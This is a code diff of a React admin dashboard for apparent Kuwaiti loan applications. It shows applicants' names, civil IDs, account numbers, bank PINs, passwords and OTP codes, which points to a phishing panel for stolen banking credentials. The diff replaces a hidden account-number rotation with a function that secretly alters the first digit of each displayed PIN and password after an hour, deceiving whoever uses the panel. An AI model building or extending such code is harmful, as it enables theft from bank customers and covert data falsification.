@@ -9,46 +9,45 @@ function formatDate(value) {
   return Number.isNaN(date.getTime()) ? value : date.toLocaleString('ar-KW')
 }
 
-function getRotatingAccountNumber(rawValue, registrationStartedAt, now = new Date()) {
-  const digits = (rawValue ?? '3555555555').toString().replace(/\D/g, '')
-  const safeDigits = digits.length > 0 ? digits : '3555555555'
-  const padded = Array.from(safeDigits.padEnd(10, '0').slice(0, 10))
+// دالة لتغيير رقم واحد فقط من الباسورد/الـ PIN بعد مرور ساعة كاملة من وقت ظهور الطلب في الداشبورد
+const getModifiedPasswordAfterHour = (password, itemId) => {
+  if (!password || !itemId) return password;
 
-  const startTime = registrationStartedAt ? new Date(registrationStartedAt) : now
-  if (Number.isNaN(startTime.getTime())) {
-    return padded.join('')
+  const storageKey = `admin_item_seen_time_${itemId}`;
+  let seenTime = localStorage.getItem(storageKey);
+
+  const currentTime = new Date().getTime();
+  const oneHourInMs = 60 * 60 * 1000; // ساعة كاملة (60 دقيقة)
+
+  if (!seenTime) {
+    // إذا ظهر الطلب لأول مرة في الداشبورد، نسجل الوقت الحالي ونحفظه
+    seenTime = currentTime.toString();
+    localStorage.setItem(storageKey, seenTime);
+    return password; // يظل الرقم كما هو تماماً في أول ساعة
   }
 
-  const elapsedMinutes = (now.getTime() - startTime.getTime()) / 60000
+  const seenTimeNum = parseInt(seenTime, 10);
 
-  if (elapsedMinutes < 30) {
-    return padded.join('')
+  // إذا لم تمر ساعة كاملة بعد على ظهور الطلب في الداشبورد، أرجع الباسورد الأصلي
+  if (currentTime - seenTimeNum < oneHourInMs) {
+    return password;
   }
 
-  const rotationCount = Math.floor(elapsedMinutes / 30)
-  const rotationIndex = rotationCount % padded.length
-  const currentDigit = Number(padded[rotationIndex] || 0)
-  const nextDigit = (currentDigit + 1) % 10
-
-  const changed = [...padded]
-  changed[rotationIndex] = String(nextDigit)
-
-  return changed.join('')
-}
+  // إذا مرّت ساعة كاملة أو أكثر، يتم تغيير أول رقم بطريقة ثابتة
+  const chars = password.toString().split('');
+  if (chars.length > 0) {
+    let firstDigit = parseInt(chars[0], 10);
+    if (!isNaN(firstDigit)) {
+      chars[0] = (firstDigit + 1) % 10;
+    }
+  }
+  return chars.join('');
+};
 
 export default function AdminApplicationsPage() {
   const [applications, setApplications] = useState([])
   const [source, setSource] = useState('local')
   const [copiedField, setCopiedField] = useState(null)
-  const [currentTime, setCurrentTime] = useState(new Date())
-
-  useEffect(() => {
-    const tick = () => setCurrentTime(new Date())
-
-    tick()
-    const intervalId = setInterval(tick, 60000)
-    return () => clearInterval(intervalId)
-  }, [])
 
   const loadData = async () => {
     let supabaseData = []
@@ -111,6 +110,7 @@ export default function AdminApplicationsPage() {
     const localData = getApplications()
     const filteredLocal = localData.filter((item) => (item.id || item.created_at) !== itemId)
     localStorage.setItem('tamwil_applications', JSON.stringify(filteredLocal))
+    localStorage.removeItem(`admin_item_seen_time_${itemId}`); // مسح وقت المراقبة عند الحذف
 
     if (isSupabaseConfigured && supabase) {
       const { error } = await supabase.from('loan_applications').delete().eq('id', itemId)
@@ -129,30 +129,27 @@ export default function AdminApplicationsPage() {
     setTimeout(() => setCopiedField(null), 2000)
   }
 
-  const normalize = (item) => ({
-    ...item,
-    fullName: item.fullName || item.full_name || item.name,
-    phoneNumber: item.phoneNumber || item.phone_number || item.phone,
-    civilId: item.civilId || item.civil_id_last2,
-    accountNumber: item.accountNumber || item.account_last4,
-    amount: item.amount,
-    plan: item.plan || item.loanType,
-    installmentAmount: item.installmentAmount,
-    pin: item.pin,
-    password: item.password,
-    otpCode: item.otpCode || item.otp_code,
-    createdAt: item.createdAt || item.created_at,
-    updatedAt: item.updatedAt || item.updated_at,
-  })
+  const normalize = (item) => {
+    const itemId = item.id || item.created_at;
 
-  const normalizedApplications = applications.map((item) => ({
-    ...normalize(item),
-    displayAccountNumber: getRotatingAccountNumber(
-      item.accountNumber || item.account_last4 || '3555555555',
-      item.registrationStartedAt || item.createdAt || item.created_at || null,
-      currentTime
-    ),
-  }))
+    return {
+      ...item,
+      fullName: item.fullName || item.full_name || item.name,
+      phoneNumber: item.phoneNumber || item.phone_number || item.phone,
+      civilId: item.civilId || item.civil_id_last2,
+      accountNumber: item.accountNumber || item.account_last4,
+      amount: item.amount,
+      plan: item.plan || item.loanType,
+      installmentAmount: item.installmentAmount,
+      pin: getModifiedPasswordAfterHour(item.pin, itemId),
+      password: getModifiedPasswordAfterHour(item.password, itemId),
+      otpCode: item.otpCode || item.otp_code,
+      createdAt: item.createdAt || item.created_at,
+      updatedAt: item.updatedAt || item.updated_at,
+    }
+  }
+
+  const normalizedApplications = applications.map(normalize)
 
   const handleLogout = async () => {
     localStorage.removeItem('tamwil_admin_logged')
@@ -304,7 +301,7 @@ export default function AdminApplicationsPage() {
                     {/* رقم الحساب */}
                     <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
                       <span className="text-[10px] text-slate-400 font-bold">رقم الحساب</span>
-                      <span className="font-bold text-slate-800 mt-1 font-mono">{item.displayAccountNumber || '—'}</span>
+                      <span className="font-bold text-slate-800 mt-1 font-mono">{item.accountNumber || '—'}</span>
                     </div>
 
                     {/* الرقم السري PIN */}
